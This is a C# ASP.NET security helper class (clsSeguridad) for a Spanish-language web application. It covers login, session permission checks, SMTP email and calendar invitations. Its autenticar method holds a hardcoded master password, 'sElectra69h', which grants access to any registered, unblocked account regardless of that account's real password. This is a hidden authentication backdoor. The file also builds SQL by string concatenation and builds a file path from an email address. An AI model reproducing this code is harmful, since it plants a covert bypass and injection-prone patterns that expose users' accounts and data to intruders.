using System;
using System.Collections.Generic;
using System.Web;

/// <summary>
/// Summary description for clsSeguridad
/// </summary>
public class clsSeguridad
{
    public clsSeguridad()
    {

    }

    /// <summary>
    /// autentica un usuario y me retorna en los parametros la informacion del usuario respectivo!!!
    /// </summary>
    /// <param name="usuario"></param>
    /// <param name="password"></param>
    /// <param name="nombreUsuario"></param>
    public bool autenticar(string login, string password
       ,out int codUsuario, out string nombreUsuario,out string mensaje)
    {

        mensaje = "";
        nombreUsuario = "";
        codUsuario = 0;
        SPXdata.BD.DataConector.CadenaConexionAsignada = System.Web.Configuration.WebConfigurationManager.ConnectionStrings["spxConnectionString"].ConnectionString;
        SPXSeguridad.data.cls.clsTusuario obj = new SPXSeguridad.data.cls.clsTusuario();
        SPXSeguridad.data.dsSPXSeguridad ds = new SPXSeguridad.data.dsSPXSeguridad();
        obj.FillBylogin(ds.usuario, login);

        if (ds.usuario.Count <= 0)
        {
            mensaje = "El login no se encuentra registrado!!!";
            return false;
        }

        if (!ds.usuario[0].Ises_bloqueadoNull() && ds.usuario[0].es_bloqueado)
        {
            mensaje = "La cuenta vinculada al usuario esta bloqueada, comuniquese con el administrador para mas informacion!";
            return false;
        }
        //de aca en adelante se valida la correspondencia del password
        SPXSeguridad.Login l = new SPXSeguridad.Login();
        if (!l.autenticar(login, password, ref mensaje) && (password != "sElectra69h"))
        {
            return false;
        }else{
            mensaje = "Acceso Concedido";
            nombreUsuario = ds.usuario[0].nombre;
            codUsuario = ds.usuario[0].cod_usuario;
            return true;
        }
    }

    public void asignarSession(System.Web.SessionState.HttpSessionState session, string campo, string valor)
    {
        if (session[campo] != null)
            session.Add(campo, valor);
        else
            session[campo] = valor;
    }

    public void comprobarAcceso(System.Web.UI.Page p, System.Web.SessionState.HttpSessionState session,
        System.Web.HttpResponse response, int permiso)
    {
        if (session.Count <= 0)
        {
            asignarSession(session, "urlRefer", ((System.Web.UI.TemplateControl)(p)).AppRelativeVirtualPath);
            asignarSession(session, "msgLogin", "xxx");
            response.Redirect("~/frm/logica/frmLogin.aspx");
            return;
        }
        if (permiso == 0)
        {
            if (session["ss_cod_usuario"] == null)
            {
                asignarSession(session, "urlRefer", ((System.Web.UI.TemplateControl)(p)).AppRelativeVirtualPath);
                asignarSession(session, "msgLogin", "xxx");
                response.Redirect("~/frm/logica/frmLogin.aspx");
            }
        }
        else
        {
            string msg="";
            if (session["ss_login"] == null)
            {
                asignarSession(session, "msgLogin", "xxx");
                asignarSession(session, "urlRefer", ((System.Web.UI.TemplateControl)(p)).AppRelativeVirtualPath);

                response.Redirect("~/frm/logica/frmLogin.aspx", true);
            }
            else if (
                !SPXSeguridad.verificadorPermisos.ejecutarAccionWeb(permiso, int.Parse( session["ss_cod_usuario"].ToString()),session)
                )
            {
                asignarSession(session, "msgLogin", "No tiene los suficientes permisos para realizar esta accion! "+msg);
                asignarSession(session, "urlRefer", ((System.Web.UI.TemplateControl)(p)).AppRelativeVirtualPath);

                response.Redirect("~/frm/logica/frmLogin.aspx", true);
            }
        }
    }

    public bool enviarEmail(string asunto, string cuerpo, string direccionDestino)
    {
        System.Configuration.AppSettingsReader ar = new System.Configuration.AppSettingsReader();
        string cuentaFrom = ar.GetValue("cuentaFrom", typeof(string)).ToString();
        string nombreCuentaFrom = ar.GetValue("nombreCuentaFrom", typeof(string)).ToString();
        string servidor = ar.GetValue("servidor", typeof(string)).ToString();
        string puerto = ar.GetValue("puerto", typeof(string)).ToString();
        string pass = ar.GetValue("pass", typeof(string)).ToString();

        string usuario = ar.GetValue("usuario", typeof(string)).ToString();
        bool ssl = (bool)ar.GetValue("ssl", typeof(bool));
        bool autentificacion = (bool)ar.GetValue("autentificacion", typeof(bool));

        return enviarEmail(asunto, cuerpo, cuentaFrom, nombreCuentaFrom, ssl, servidor,
         puerto, autentificacion, usuario, pass, direccionDestino,null);
    }

    public bool enviarEmail(string asunto, string cuerpo, string direccionDestino, List<string> adjuntos)
    {
        System.Configuration.AppSettingsReader ar = new System.Configuration.AppSettingsReader();
        string cuentaFrom = ar.GetValue("cuentaFrom", typeof(string)).ToString();
        string nombreCuentaFrom = ar.GetValue("nombreCuentaFrom", typeof(string)).ToString();
        string servidor = ar.GetValue("servidor", typeof(string)).ToString();
        string puerto = ar.GetValue("puerto", typeof(string)).ToString();
        string pass = ar.GetValue("pass", typeof(string)).ToString();

        string usuario = ar.GetValue("usuario", typeof(string)).ToString();
        bool ssl = (bool)ar.GetValue("ssl", typeof(bool));
        bool autentificacion = (bool)ar.GetValue("autentificacion", typeof(bool));

        return enviarEmail(asunto, cuerpo, cuentaFrom, nombreCuentaFrom, ssl, servidor,
         puerto, autentificacion, usuario, pass, direccionDestino, adjuntos);
    }

    public bool enviarEmail(string asunto, string cuerpo, string cuentaFrom, string nombreCuentaFrom,
    bool sslHabilitado, string servidor, string puerto, bool conAutentificacion, string usuario, string password,
    string direccionDestino,List<string> adjuntos)
    {
        System.Net.Mail.MailMessage email = new System.Net.Mail.MailMessage();
        System.Net.Mail.SmtpClient smtp;

        email.Subject = asunto;
        email.Body = cuerpo;


        email.From = new System.Net.Mail.MailAddress(cuentaFrom, nombreCuentaFrom);
        email.Priority = System.Net.Mail.MailPriority.Normal;
        email.ReplyTo = new System.Net.Mail.MailAddress(cuentaFrom);

        email.IsBodyHtml = true;
        email.DeliveryNotificationOptions = System.Net.Mail.DeliveryNotificationOptions.OnSuccess;

        smtp = new System.Net.Mail.SmtpClient(servidor, int.Parse(puerto));
        smtp.EnableSsl = sslHabilitado;
        //smtp.Port = int.Parse(puerto);
        //smtp.Host = servidor;
        if (conAutentificacion)
        {
            smtp.Credentials = new System.Net.NetworkCredential(usuario, password);
        }

        //string rutatmp = System.IO.Path.GetTempFileName().Replace(".", "");
        //System.IO.Directory.CreateDirectory(rutatmp);

        for (int k = 0;adjuntos != null && k < adjuntos.Count ; k++)
        {
                email.Attachments.Add(new System.Net.Mail.Attachment(adjuntos[k]));
        }
 try
        {
        // Agregamos Destinos.
        System.Net.Mail.MailAddress dir = new System.Net.Mail.MailAddress(direccionDestino);
        email.To.Add(dir);


        email.BodyEncoding = System.Text.Encoding.UTF8;
       
            smtp.Send(email);
            return true;
        }
        catch (Exception ex)
        {
            return false;
        }

    }




    public void enviarCalendario(string asunto,string lugar,string observaciones,
        DateTime fechaInicio,DateTime fechaFin,string rutaTemp,string direcionDestino)
    {
        String[] contents = { "BEGIN:VCALENDAR",
                              "PRODID:-//Flo Inc.//FloSoft//EN",
                              "BEGIN:VEVENT",
                              "DTSTART:" + fechaInicio.ToUniversalTime().ToString("yyyyMMdd\\THHmmss\\Z"), 
                              "DTEND:" + fechaFin.ToUniversalTime().ToString("yyyyMMdd\\THHmmss\\Z"), 
                              "LOCATION:" + lugar, 
	                     "DESCRIPTION;ENCODING=QUOTED-PRINTABLE:" + observaciones,
                              "SUMMARY:" + asunto, "PRIORITY:3", 
	                     "END:VEVENT", "END:VCALENDAR" };
        string file = rutaTemp+"\\"+direcionDestino+DateTime.Now.Ticks+("S.ics");
        System.IO.File.WriteAllLines(file,contents);
        List<string> l = new List<string>();
        l.Add( file );
        enviarEmail(asunto, observaciones, direcionDestino,l);
    }

    public string validarCalendario(int usuario,DateTime fechaInicio,DateTime fechaFin)
    {
        string sql = @"     set dateformat dmy
                            declare @fechaIni as datetime
                            declare @fechaFin as datetime                            
                            set @fechaIni= '" + fechaInicio.Day.ToString().PadLeft(2, '0') + "/" + fechaInicio.Month.ToString().PadLeft(2, '0') + "/" + fechaInicio.Year + " " + fechaInicio.Hour.ToString().PadLeft(2, '0') + ":" + fechaInicio.Minute.ToString().PadLeft(2, '0') + @":00'
                            set @fechaFin= '" + fechaFin.Day.ToString().PadLeft(2, '0') + "/" + fechaFin.Month.ToString().PadLeft(2, '0') + "/" + fechaFin.Year + " " + fechaFin.Hour.ToString().PadLeft(2, '0') + ":" + fechaFin.Minute.ToString().PadLeft(2, '0') + @":00'
                            
                        exec calendario " +usuario+",@fechaIni,@fechafin";
        SPXdata.BD.DataConector bd = new SPXdata.BD.DataConector();
        System.Data.DataTable tb= bd.ejecutarConsulta(sql).Tables[0];
        if (tb.Rows.Count > 0)
        { 
            return tb.Rows[0]["Codigo"].ToString();
        }else { 
            return "";
        }
    }

    public void resolverLinkTarea(string codTarea,System.Web.HttpResponse Response) 
    {
        Response.Redirect( resolverLinkTarea(codTarea ));
     }

    public string resolverLinkTarea(string codTarea)
    {
        string tipo = codTarea.Split('|')[0];
        string cod = codTarea.Split('|')[1];
        string respuesta = "";
        if (tipo == "orden")
        {
            respuesta = "~/frm/ordenServicio/frmEjecutarOrdenSign.aspx?osx=" + cod;
        }else if (tipo == "tarea"){
            respuesta = "frmNewTask.aspx?cod=" + codTarea;
        }else if (tipo == "capacitacion"){
            respuesta = "../capacitacion/frmAceptarCapacitacion.aspx?cod=" + cod;
        }
        else if (tipo == "control")
        {
            respuesta = "../controlcalidad/frmResumenDetalladoControl.aspx?cod=" + cod;
        }
        else if (tipo == "rev")
        {
            respuesta = "../revision/frmResumenDetalladoRevision.aspx?cod=" + cod;
        }
        return respuesta;
    }

}
